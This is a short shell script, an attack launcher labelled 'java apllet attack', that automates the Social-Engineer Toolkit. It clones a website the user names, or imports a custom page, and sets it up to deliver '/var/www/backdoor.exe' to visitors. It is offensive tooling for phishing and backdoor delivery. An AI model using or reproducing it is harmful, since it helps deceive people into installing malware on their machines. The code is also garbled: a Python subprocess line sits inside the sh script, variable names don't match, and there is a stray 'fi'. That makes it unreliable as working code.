#!/bin/sh
clear
echo "===================================="
echo " _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ "
echo "|		/////    ///////  //      / |"
echo "|		/    /   /        //      / |"
echo "|		/     /  /        / /     / |"
echo "|		/     /  //////   /  /    / |"
echo "|		/     /  /        /   /   / |"
echo "|		/     /  /        /    /  / |"
echo "|		/    /   /        /     / / |"
echo "|		////     ///////  /      // |"
echo "|_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _|"
echo "===================================="
echo "           			By Vishnu aka 34gLe 3Ye		    "
echo " _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ "
echo "         java apllet attack       "
echo "----------------------------------------"
echo "1) site cloner "
echo "2) custom import (/var/www/index.html)"
echo "*************************************"
echo -n "Choose Hunting Technique (1-2)"
read attck
if [ $attck == 1 ]; then
echo -n "Which site would you like to clone ?"
read site
myproc = subprocess.Popen(['echo %s | bash fire-set.sh' %site ], stdin = subprocess.PIPE, stdout = subprocess.PIPE, shell=True)
fi
echo "1
2
1
2
$site
14
/var/www/backdoor.exe
" >> /usr/share/set/cloner.txt
./set-automate cloner.txt
rm cloner.txt
fi
if [ "$attack" == "2" ]; then
cd /usr/share/set
echo "1
2
1
3
/var/www/
14
/var/www/backdoor.exe
" >> /usr/share/set/setoolkit/cloner.txt
./set-automate cloner.txt
rm cloner.txt
fi

